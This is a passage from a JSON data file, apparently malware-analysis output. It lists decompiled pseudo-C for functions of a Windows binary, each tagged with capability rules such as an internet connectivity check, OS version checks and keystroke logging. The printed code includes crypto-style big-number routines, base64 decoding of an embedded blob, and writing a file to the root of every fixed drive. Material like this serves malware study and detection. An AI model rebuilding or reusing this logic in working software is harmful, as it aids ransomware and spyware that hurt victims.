= iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < iVar1);\n                    }\n                    puVar2 = &stack0xffffecdc;\n                    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    iVar4 = 0;\n                    if (0 < var_330h_2) {\n                        puVar2 = &stack0xffffecdc;\n                        do {\n                            *puVar2 = (&fcn.00403940::var_334h_7)[iVar4];\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < var_330h_2);\n                    }\n                    iVar4 = 0;\n                    puVar2 = &stack0xffffe694;\n                    for (iVar5 = 200; iVar1 = iStack2440,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    if (0 < iStack2440) {\n                        puVar2 = &stack0xffffe694;\n                        do {\n                            *puVar2 = (&fcn.00403940::var_65ch)[iVar4];\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < iVar1);\n                    }\n                    iVar4 = 0;\n                    puVar2 = &stack0xffffe370;\n                    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar2 = 0;\n                        puVar2 = puVar2 + 1;\n                    }\n                    if (0 < var_334h_9) {\n                        puVar2 = &stack0xffffe370;\n                        do {\n                            *puVar2 = *(&stack0xfffffccc + iVar4 * 4);\n                            iVar4 = iVar4 + 1;\n                            puVar2 = puVar2 + 1;\n                        } while (iVar4 < var_334h_9);\n                    }\n                    fcn.004025d0(&stack0xffffe9b4, var_334h_9, in_stack_ffffe370);\n                    puStack5712 = &stack0xfffff350;\n                    uStack5716 = 0x403d99;\n                    puVar2 = fcn.00404020();\n                    puVar7 = &fcn.00403940::var_334h_9;\n                    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = *puVar2;\n                        puVar2 = puVar2 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                }\n                uStack3268 = uStack3268 << 1;\n                iVar4 = 0;\n                puVar2 = &stack0xfffff970;\n                for (iVar5 = 200; iVar1 = iStack1632,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                iStack1684 = iStack1632;\n                if (0 < iStack1632) {\n                    puVar2 = &stack0xfffff970;\n                    do {\n                        *puVar2 = (&fcn.00403940::var_334h_2)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar1);\n                }\n                puVar2 = &stack0xfffff64c;\n                for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                iStack2488 = var_330h_2;\n                iVar4 = 0;\n                if (0 < var_330h_2) {\n                    puVar2 = &stack0xfffff64c;\n                    do {\n                        *puVar2 = (&fcn.00403940::var_334h_7)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < var_330h_2);\n                }\n                iVar4 = 0;\n                puVar2 = &stack0xfffff004;\n                for (iVar5 = 200; iVar1 = iStack2440,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                aiStack4096[0] = iStack2440;\n                if (0 < iStack2440) {\n                    puVar2 = &stack0xfffff004;\n                    do {\n                        *puVar2 = (&fcn.00403940::var_65ch)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar1);\n                }\n                iVar4 = 0;\n                puVar2 = &stack0xffffece0;\n                for (iVar5 = 200; iVar1 = iStack2440,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                if (0 < iStack2440) {\n                    puVar2 = &stack0xffffece0;\n                    do {\n                        *puVar2 = (&fcn.00403940::var_65ch)[iVar4];\n                        iVar4 = iVar4 + 1;\n                        puVar2 = puVar2 + 1;\n                    } while (iVar4 < iVar1);\n                }\n                puStack4908 = 0x403ecb;\n                fcn.004025d0(&stack0xfffff324, iVar1, in_stack_ffffece0);\n                uStack3300 = 0x403edd;\n                puVar2 = fcn.00404020();\n                puVar7 = &stack0xfffff678;\n                for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar7 = puVar7 + 1;\n                }\n                if ((iStack2440 == 1) && (var_65ch == 1)) {\n                    if ((cStack3249 == '\\0') || ((var_334h_8 & 1) == 0)) {\n                        iVar4 = 0;\n                        piVar8 = piStack3264;\n                        for (iVar5 = 200; piVar8 = piVar8 + 1,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *piVar8 = 0;\n                        }\n                        *piStack3264 = var_334h_9;\n                        piVar8 = piStack3264;\n                        if (0 < var_334h_9) {\n                            do {\n                                piVar8[1] = *(&stack0xfffffccc + iVar4 * 4);\n                                iVar4 = iVar4 + 1;\n                                piVar8 = piVar8 + 1;\n                            } while (iVar4 < *piStack3264);\n                        }\n                        goto code_r0x00403f91;\n                    }\n                    goto code_r0x00403fb5;\n                }\n                iVar3 = iVar3 + 1;\n            } while ((iVar3 != var_cb8h_2) && (iStack3280 = iStack3280 + 1,  iStack3280 < 0x20));\n            puStack3272 = puStack3272 + 1;\n            iStack3276 = iStack3276 + 1;\n        } while (iStack3276 < var_330h_3);\n    }\n    if ((cStack3249 == '\\0') || ((var_334h_8 & 1) == 0)) {\n        iVar4 = 0;\n        piVar8 = piStack3264;\n        for (iVar5 = 200; piVar8 = piVar8 + 1,  iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar8 = 0;\n        }\n        *piStack3264 = var_334h_9;\n        piVar8 = piStack3264;\n        if (0 < var_334h_9) {\n            do {\n                piVar8[1] = *(&stack0xfffffccc + iVar4 * 4);\n                iVar4 = iVar4 + 1;\n                piVar8 = piVar8 + 1;\n            } while (iVar4 < *piStack3264);\n        }\ncode_r0x00403f91:\n        fcn.00406bb6(iVar3);\n        return;\n    }\ncode_r0x00403fb5:\n    uStack3300 = 0x403fc6;\n    fcn.00402470();\n    fcn.00406bb6(iVar3);\n    return;\n}\n",
        "token_count": 4607
    },
    "00404020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404020(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    int32_t *piVar12;\n    int32_t var_330h_3;\n    uint var_334h;\n    uint var_650h;\n    int32_t var_654h_3;\n    uint var_658h_2;\n    uint var_668h;\n    uint var_660h;\n    uint var_65ch;\n    int32_t in_stack_0000064c;\n    int32_t var_654h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_4h;\n    uint in_stack_fffff330;\n    uint auStack2476 [3];\n    uint var_678h;\n    uint var_66ch;\n    uint var_668h_3;\n    uint var_664h;\n    uint var_660h_2;\n    uint var_65ch_2;\n    uint var_658h;\n    uint var_654h_2;\n    uint uStack1684;\n    uint in_stack_fffff980;\n    uint32_t uStack1660;\n    uint var_668h_2;\n    int32_t iStack1640;\n    int32_t iStack1636;\n    int32_t *piStack1632;\n    int32_t iStack1628;\n    uint var_330h_2;\n    uint var_32ch_2;\n    int32_t var_330h_4;\n    uint var_32ch_3;\n    uint var_4h_2;\n    uint var_ch;\n    uint var_10h;\n    uint32_t uStack8;\n    \n    uStack8 = *0x41b0e4 ^ &stack0xfffffffc;\n    iStack1636 = var_654h_3 + 1;\n    piStack1632 = param_1;\n    puVar10 = &fcn.00404020::var_32ch_3;\n    for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iVar7 = var_654h_3 + -1;\n    if (iVar7 < var_330h_3) {\n        puVar10 = &fcn.00404020::var_334h + iVar7;\n        puVar11 = &fcn.00404020::var_32ch_3;\n        for (iVar8 = var_330h_3 - iVar7; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar11 = *puVar10;\n            puVar10 = puVar10 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    }\n    var_330h_4 = var_330h_3 - iVar7;\n    if (var_330h_3 - iVar7 < 1) {\n        var_330h_4 = 1;\n    }\n    iVar7 = var_330h_4;\n    puVar10 = &stack0xfffff654;\n    for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iVar8 = 0;\n    if (0 < var_654h) {\n        puVar10 = &stack0xfffff654;\n        do {\n            *puVar10 = *(&stack0x00000654 + iVar8 * 4);\n            iVar8 = iVar8 + 1;\n            puVar10 = puVar10 + 1;\n        } while (iVar8 < var_654h);\n    }\n    iVar8 = 0;\n    puVar10 = &stack0xfffff330;\n    for (iVar9 = 200; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    if (0 < iVar7) {\n        puVar10 = &stack0xfffff330;\n        do {\n            *puVar10 = (&fcn.00404020::var_32ch_3)[iVar8];\n            iVar8 = iVar8 + 1;\n            puVar10 = puVar10 + 1;\n        } while (iVar8 < iVar7);\n    }\n    fcn.004025d0(&stack0xfffff9a4, iVar7, in_stack_fffff330);\n    puVar10 = &fcn.00404020::var_32ch_3;\n    for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    if (iStack1636 < iStack1628) {\n        puVar10 = &fcn.00404020::var_330h_2 + iStack1636;\n        puVar11 = &fcn.00404020::var_32ch_3;\n        for (iVar7 = iStack1628 - iStack1636; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar11 = *puVar10;\n            puVar10 = puVar10 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    }\n    var_330h_4 = iStack1628 - iStack1636;\n    if (iStack1628 - iStack1636 < 1) {\n        var_330h_4 = 1;\n    }\n    piVar1 = piStack1632 + 1;\n    piVar6 = piVar1;\n    for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    *piStack1632 = 1;\n    if (iStack1636 < var_330h_3) {\n        var_330h_3 = iStack1636;\n    }\n    if (0 < var_330h_3) {\n        piVar6 = &fcn.00404020::var_334h;\n        piVar12 = piVar1;\n        for (iVar7 = var_330h_3; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *piVar12 = *piVar6;\n            piVar6 = piVar6 + 1;\n            piVar12 = piVar12 + 1;\n        }\n    }\n    *piStack1632 = var_330h_3;\n    puVar10 = &fcn.00404020::var_330h_2;\n    for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1628 = 1;\n    iStack1640 = 0;\n    if (0 < var_330h_4) {\n        do {\n            uVar2 = (&fcn.00404020::var_32ch_3)[iStack1640];\n            if (uVar2 != 0) {\n                iVar8 = 0;\n                uStack1660 = 0;\n                iVar7 = iStack1640;\n                if (0 < var_654h_3) {\n                    do {\n                        if (iStack1636 <= iVar7) goto code_r0x00404258;\n                        iVar3 = (&fcn.00404020::var_658h_2)[iVar8] * uVar2;\n                        uVar4 = iVar3;\n                        uVar5 = uVar4 + (&fcn.00404020::var_330h_2)[iVar7];\n                        iVar9 = uVar5 + uStack1660;\n                        uStack1660 = (iVar3 >> 0x20) + CARRY4(uVar4, (&fcn.00404020::var_330h_2)[iVar7]) +\n                                     CARRY4(uVar5, uStack1660);\n                        (&fcn.00404020::var_330h_2)[iVar7] = iVar9;\n                        iVar8 = iVar8 + 1;\n                        iVar7 = iVar7 + 1;\n                    } while (iVar8 < var_654h_3);\n                }\n                if (iVar7 < iStack1636) {\n                    (&fcn.00404020::var_330h_2)[iVar7] = uStack1660;\n                }\n            }\ncode_r0x00404258:\n            iStack1640 = iStack1640 + 1;\n        } while (iStack1640 < var_330h_4);\n    }\n    iStack1628 = iStack1636;\n    while ((1 < iStack1628 && (*(&stack0xfffff9a4 + iStack1628 * 4) == 0))) {\n        iStack1628 = iStack1628 + -1;\n    }\n    uStack1684 = 0x4042ae;\n    fcn.004023f0(&stack0xfffff9a4);\n    if ((piStack1632[200] & 0x80000000U) != 0) {\n        puVar10 = &fcn.00404020::var_32ch_3;\n        for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        (&fcn.00404020::var_32ch_3)[iStack1636] = 1;\n        var_330h_4 = iStack1636 + 1;\n        uStack1684 = 0x4042fc;\n        piVar6 = fcn.00402250(piStack1632);\n        piVar12 = piStack1632;\n        for (iVar7 = 0xc9; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *piVar12 = *piVar6;\n            piVar6 = piVar6 + 1;\n            piVar12 = piVar12 + 1;\n        }\n    }\n    do {\n        iVar7 = *piStack1632;\n        if (iVar7 == var_654h_3) {\n            iVar8 = 0;\n            piVar6 = piVar1;\n            if (0 < iVar7) {\n                do {\n                    if (*piVar6 != (&fcn.00404020::var_658h_2)[iVar8]) goto code_r0x00404345;\n                    iVar8 = iVar8 + 1;\n                    piVar6 = piVar6 + 1;\n                } while (iVar8 < iVar7);\n            }\n        }\n        else {\ncode_r0x00404345:\n            if (((piStack1632[200] & 0x80000000U) != 0) && (-1 < in_stack_0000064c)) goto code_r0x00404384;\n            if (((piStack1632[200] & 0x80000000U) != 0) || (-1 < in_stack_0000064c)) {\n                if (iVar7 <= var_654h_3) {\n                    iVar7 = var_654h_3;\n                }\n                iVar8 = iVar7 + -1;\n                if (iVar8 < 0) {\ncode_r0x00404384:\n                    fcn.00406bb6(in_stack_fffff980);\n                    return;\n                }\n                piVar6 = piStack1632 + iVar7;\n                while (*piVar6 == (&fcn.00404020::var_658h_2)[iVar8]) {\n                    piVar6 = piVar6 + -1;\n                    iVar8 = iVar8 + -1;\n                    if (iVar8 < 0) goto code_r0x00404384;\n                }\n                if ((iVar8 < 0) ||\n                   (piStack1632[iVar8 + 1] < (&fcn.00404020::var_658h_2)[iVar8] ||\n                    piStack1632[iVar8 + 1] == (&fcn.00404020::var_658h_2)[iVar8])) goto code_r0x00404384;\n            }\n        }\n        uStack1684 = 0x4043be;\n        fcn.004023f0(&fcn.00404020::var_654h_3);\n    } while( true );\n}\n",
        "token_count": 2839
    },
    "004043d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004043d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uchar *unaff_EDI;\n    bool bVar8;\n    int32_t var_4h;\n    \n    iVar2 = *in_EAX;\n    while ((1 < iVar2 && (in_EAX[*in_EAX] == 0))) {\n        iVar2 = *in_EAX + -1;\n        *in_EAX = iVar2;\n    }\n    uVar4 = 0x80000000;\n    iVar2 = 0x20;\n    do {\n        if ((in_EAX[*in_EAX] & uVar4) != 0) break;\n        iVar2 = iVar2 + -1;\n        uVar4 = uVar4 >> 1;\n    } while (0 < iVar2);\n    uVar4 = *in_EAX * 0x20 + -0x20 + iVar2;\n    var_4h = uVar4 >> 3;\n    if ((uVar4 & 7) != 0) {\n        var_4h = var_4h + 1;\n    }\n    if (0 < arg_8h) {\n        fcn.0040c5d0();\n    }\n    uVar4 = in_EAX[*in_EAX];\n    bVar8 = uVar4 >> 0x18 != 0;\n    if (bVar8) {\n        *unaff_EDI = uVar4 >> 0x18;\n    }\n    uVar3 = bVar8;\n    uVar6 = uVar4 >> 0x10 & 0xff;\n    if ((bVar8) || (uVar6 != 0)) {\n        unaff_EDI[uVar3] = uVar6;\n        uVar3 = uVar3 + 1;\n        bVar8 = true;\n    }\n    uVar6 = uVar4 >> 8 & 0xff;\n    if ((bVar8) || (uVar6 != 0)) {\n        unaff_EDI[uVar3] = uVar6;\n        uVar3 = uVar3 + 1;\n        bVar8 = true;\n    }\n    if ((bVar8) || ((uVar4 & 0xff) != 0)) {\n        unaff_EDI[uVar3] = uVar4 & 0xff;\n        uVar3 = uVar3 + 1;\n    }\n    iVar2 = *in_EAX + -2;\n    if (-1 < iVar2) {\n        puVar5 = unaff_EDI + uVar3 + 2;\n        piVar7 = in_EAX + *in_EAX + -1;\n        do {\n            iVar1 = *piVar7;\n            puVar5[1] = iVar1;\n            *puVar5 = iVar1 >> 8;\n            puVar5[-1] = iVar1 >> 0x10;\n            puVar5[-2] = iVar1 >> 0x18;\n            piVar7 = piVar7 + -1;\n            puVar5 = puVar5 + 4;\n            iVar2 = iVar2 + -1;\n        } while (-1 < iVar2);\n    }\n    return var_4h;\n}\n",
        "token_count": 763
    },
    "00404610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404610(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t arg_18h, uint32_t arg_1ch)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t uVar5;\n    uint *unaff_ESI;\n    uint32_t uVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4146f1;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x41b0e4 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 1;\n    unaff_ESI[5] = 0xf;\n    unaff_ESI[4] = 0;\n    var_24h = arg_18h;\n    var_1ch = 0;\n    var_20h = 0;\n    *unaff_ESI = 0;\n    if (arg_18h == 0) {\ncode_r0x004048fb:\n        if (0xf < arg_1ch) {\n            fcn.004072a9(arg_8h);\n        }\n        *in_FS_OFFSET = var_ch;\n        return;\n    }\n    do {\n        var_24h = var_24h + -1;\n        puVar4 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar4 = &arg_8h;\n        }\n        uVar6 = var_1ch;\n        if (*(puVar4 + var_20h) == '=') break;\n        puVar4 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar4 = &arg_8h;\n        }\n        uVar5 = *(puVar4 + var_20h);\n        iVar3 = fcn.00407279(uVar5);\n        if (((iVar3 == 0) && (uVar5 != 0x2b)) && (uVar5 != 0x2f)) break;\n        puVar4 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar4 = &arg_8h;\n        }\n        *(&var_14h + var_1ch) = *(puVar4 + var_20h);\n        var_1ch = var_1ch + 1;\n        var_20h = var_20h + 1;\n        if (var_1ch == 4) {\n            uVar6 = 0;\n            do {\n                var_10h._0_1_ = *(&var_14h + uVar6);\n                uVar2 = 0x41bed8;\n                uVar1 = fcn.00401270(0x41bed8);\n                *(&var_14h + uVar6) = uVar1;\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < 4);\n            uVar5 = var_14h >> 8;\n            var_18h._0_1_ = (uVar5 >> 4 & 3) + var_14h * '\\x04';\n            var_18h._1_1_ = var_14h._2_1_ >> 2 & 0xf ^ uVar5 << 4;\n            var_18h._2_1_ = var_14h._2_1_ * '@' + var_14h._3_1_;\n            var_1ch = 0;\n            do {\n                uVar1 = *(&var_18h + var_1ch);\n                if (-unaff_ESI[4] - 1 < 2) goto code_r0x004047d8;\n                uVar6 = unaff_ESI[4] + 1;\n                if (uVar6 == 0xffffffff) goto code_r0x004047d8;\n                if (unaff_ESI[5] < uVar6) {\n                    fcn.004014f0();\n                }\n                else if (uVar6 == 0) {\n                    unaff_ESI[4] = 0;\n                    puVar4 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                    }\n                    *puVar4 = 0;\n                }\n                if (uVar6 != 0) {\n                    puVar4 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                    }\n                    *(puVar4 + unaff_ESI[4]) = uVar1;\n                    unaff_ESI[4] = uVar6;\n                    puVar4 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                    }\n                    *(puVar4 + uVar6) = 0;\n                }\n                var_1ch = var_1ch + 1;\n            } while (var_1ch < 3);\n            var_1ch = 0;\n        }\n        uVar6 = var_1ch;\n    } while (var_24h != 0);\n    do {\n        if (uVar6 == 0) goto code_r0x004048fb;\n        if (uVar6 < 4) {\n            fcn.0040c5d0(&var_14h + uVar6, 0, 4 - uVar6, uVar2);\n        }\n        uVar6 = 0;\n        do {\n            var_10h._0_1_ = *(&var_14h + uVar6);\n            uVar2 = 0x41bed8;\n            uVar1 = fcn.00401270(0x41bed8);\n            *(&var_14h + uVar6) = uVar1;\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 4);\n        uVar5 = var_14h >> 8;\n        var_18h._0_1_ = (uVar5 >> 4 & 3) + var_14h * '\\x04';\n        var_18h._2_1_ = var_14h._2_1_ * '@' + var_14h._3_1_;\n        var_18h._1_1_ = var_14h._2_1_ >> 2 & 0xf ^ uVar5 << 4;\n        var_20h = 0;\n        if (var_1ch - 1 < 1) goto code_r0x004048fb;\n        while( true ) {\n            uVar1 = *(&var_18h + var_20h);\n            if ((-unaff_ESI[4] - 1 < 2) || (uVar6 = unaff_ESI[4] + 1,  uVar6 == 0xffffffff)) break;\n            if (unaff_ESI[5] < uVar6) {\n                fcn.004014f0();\n            }\n            else if (uVar6 == 0) {\n                unaff_ESI[4] = 0;\n                puVar4 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                *puVar4 = 0;\n            }\n            if (uVar6 != 0) {\n                puVar4 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                *(puVar4 + unaff_ESI[4]) = uVar1;\n                unaff_ESI[4] = uVar6;\n                puVar4 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                *(puVar4 + uVar6) = 0;\n            }\n            var_20h = var_20h + 1;\n            if (var_1ch - 1 <= var_20h) goto code_r0x004048fb;\n        }\ncode_r0x004047d8:\n        fcn.00406aad(\"string too long\");\n    } while( true );\n}\n",
        "token_count": 1976
    },
    "004049f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004049f0(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_324h;\n    uint var_31ch;\n    uint var_10h;\n    uint var_ch;\n    uint32_t in_stack_fffffcac;\n    uint in_stack_fffffcb0;\n    uint in_stack_fffffcb4;\n    uint in_stack_fffffcb8;\n    uint arg_18h;\n    uint arg_1ch;\n    uint lpNumberOfBytesWritten;\n    int32_t var_320h;\n    uint var_31ch_2;\n    uint *var_318h;\n    uint32_t var_304h;\n    uint lpFileName;\n    char var_f4h;\n    uint var_f3h;\n    uint lpRootPathName;\n    ushort var_8ah;\n    uint var_88h;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41471b;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x41b0e4 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    arg_1ch = 0xf;\n    arg_18h = 0;\n    uVar5 = in_stack_fffffcac & 0xffffff00;\n    fcn.004012f0();\n    fcn.00404610(uVar5, in_stack_fffffcb0, in_stack_fffffcb4, in_stack_fffffcb8, arg_18h, arg_1ch);\n    var_4h = 0;\n    var_f4h = '\\0';\n    fcn.0040c5d0(&var_f3h, 0, 99);\n    fcn.00407e10(&var_f4h, \n                 \"AAABAFxXlqBiGEoIVCFtKr20ZRvXxz3w37go/PPD0q5ZfN931ybM+hNFwXrQUW8ObIVy/VMdGDDV5ecCnu1A92K4bDdSrnJaOaz0NQ5JajrDsL4Y/liX0eqL39js1CctQBRJsYauoYd9g3JTAY4BZxvYGZgFrwj0PSLulix/ztXyEMXUwzaRDmaWIT0JzEPgT2Cf04LfqHYHfXMzLw5R1lYz6SogduAGmsjsz1OSzjCcu/AtwZu1Cqi87t5UfzjPmvE1AOpMshOFdgtUwnxFeTNQqjn+X1Dj4aic37NYsDg7GBD6wClEXLXVRVaO/a3FHo+1m9TJoMMcUzpjNzgbhjD3D1//Bw==\"\n                 , 0x1e);\n    pcVar2 = &var_f4h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h = pcVar2 - &var_f3h;\n    fcn.00406290(arg_8h);\n    iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)();\n    if (iVar3 != 0) {\n        fcn.0040809d(&lpFileName, 0x104, 0x419ad8);\n        fcn.0040809d(&lpFileName, 0x104, 0x419adc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpFileName, 0xc0000000, 0, 0, 2);\n        if (iVar3 != -1) {\n            puVar4 = var_318h;\n            if (var_304h < 0x10) {\n                puVar4 = &var_318h;\n            }\n            pcVar2 = puVar4 + 1;\n            do {\n                cVar1 = *puVar4;\n                puVar4 = puVar4 + 1;\n            } while (cVar1 != '\\0');\n            puVar6 = var_318h;\n            if (var_304h < 0x10) {\n                puVar6 = &var_318h;\n            }\n            (*_sym.imp.KERNEL32.dll_WriteFile)(iVar3, puVar6, puVar4 - pcVar2);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        }\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    var_320h = 1;\n    do {\n        if ((uVar5 & 1 << (var_320h & 0x1f)) != 0) {\n            lpRootPathName._0_2_ = var_320h + 0x41;\n            stack0xffffff6e = 0x5c003a;\n            var_8ah = 0;\n            fcn.0040c5d0(&var_88h);\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)();\n            if (((iVar3 != 5) && (iVar3 != 6)) && (iVar3 != 1)) {\n                fcn.0040809d(&lpRootPathName, 0x40, 0x419adc);\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpRootPathName, 0xc0000000, 0, 0, 2);\n                if (iVar3 != -1) {\n                    puVar4 = var_318h;\n                    if (var_304h < 0x10) {\n                        puVar4 = &var_318h;\n                    }\n                    pcVar2 = puVar4 + 1;\n                    do {\n                        cVar1 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (cVar1 != '\\0');\n                    puVar6 = var_318h;\n                    if (var_304h < 0x10) {\n                        puVar6 = &var_318h;\n                    }\n                    (*_sym.imp.KERNEL32.dll_WriteFile)(iVar3, puVar6, puVar4 - pcVar2);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                }\n            }\n        }\n        var_320h = var_320h + 1;\n    } while (var_320h < 0x1a);\n    if (0xf < var_304h) {\n        fcn.004072a9();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.00406bb6(arg_8h);\n    return;\n}\n",
        "token_count": 1607
    },
    "00404cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
